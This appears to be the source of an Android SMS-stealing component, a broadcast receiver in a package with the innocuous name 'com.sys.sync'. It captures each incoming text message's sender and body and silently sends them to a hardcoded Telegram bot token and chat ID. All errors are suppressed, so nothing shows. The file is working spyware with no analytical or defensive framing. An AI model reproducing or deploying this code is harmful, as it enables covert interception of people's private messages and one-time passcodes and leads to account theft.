package com.sys.sync;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            if (msgs != null) {
                for (SmsMessage sms : msgs) {
                    String data = sms.getOriginatingAddress() + " > " + sms.getMessageBody();
                    new Thread(() -> send(data)).start();
                }
            }
        } catch (Exception e) {}
    }

    private void send(String text) {
        try {
            String url = "https://api.telegram.org/bot8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
            c.setRequestMethod("GET");
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) {}
    }
}
